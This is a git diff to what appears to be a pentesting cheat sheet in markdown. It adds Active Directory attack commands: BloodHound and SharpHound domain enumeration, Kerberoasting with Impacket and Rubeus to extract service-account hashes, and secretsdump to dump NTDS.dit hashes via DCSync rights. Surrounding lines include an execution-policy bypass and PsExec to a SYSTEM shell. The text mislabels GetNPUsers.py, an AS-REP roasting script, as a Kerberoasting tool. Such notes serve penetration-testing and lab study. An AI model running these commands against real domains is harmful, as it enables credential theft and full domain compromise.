@@ -328,10 +328,20 @@ If the system has `PsExec.exe` open elevated cmd
 `.\PsExec.exe -i -s cmd.exe`
 
 ### Active Directory
+
 `powershell -ep bypass`  load a powershell shell with execution policy bypassed <br/>
 `. .\PowerView.ps1`      import the PowerView module
 
-##### Using Bloodhound
+## Gaining Infromation about AD Bloodhound
+
+### Using BloodHound Injester 
+
+```
+python3 bloodhound.py -d 'DOMAIN_NAME' -u 'VALID_USERNAME' -p 'VALID_PASSWORD' -gc 'HOSTNAME.DOMAIN' -c all -ns IP
+```
+Import the json files in bloodhound GUI <br/>
+
+### Using Shraphound 
 
 * Upload `Sharphound.ps1` (https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)
 * Then `. .\Sharhound.ps1`
@@ -339,11 +349,28 @@ If the system has `PsExec.exe` open elevated cmd
 <img src="https://imgur.com/NxWapei.png"/>
 * This command will give an archive which you will have to simply drag and drop on the bloodhound GUI running on your local machine and then quries for kerberoastable accounts or getting more information
 
-##### Using Rubeus
+## Kerberoasting Attack 
+
+### Using Impacket GETNPUsers.py
+
+If we see any kerberoastable service account through bloodhound we can get that account's hash through this impacket script <br/>
+```
+python3 GetNPUsers.py DOMAIN/USERNAME:PASSWORD -dc-ip IP -request
+```
+
+### Using Rubeus
 
 * Download rubeus `https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe`
 * Documentation `https://github.com/GhostPack/Rubeus`
 * Transfer rubeus.exe on targeted windows machine and run `.\Rubeus.exe kerberoast /outfile:C:\temp\hash.txt` to get a hash
+
+## Dumping NTDS.dit
+
+If we find a user having DCsync rights or GetChangeAll privileges meaning to replicate AD secrets (NTDS.dit) we can dump NTDS.dit <br/>
+
+```
+python3 secretsdump.py 'DOMAIN/USERNAME':'PASSOWRD'@IP -just-dc-ntlm
+```
 
 # FreeBSD
 
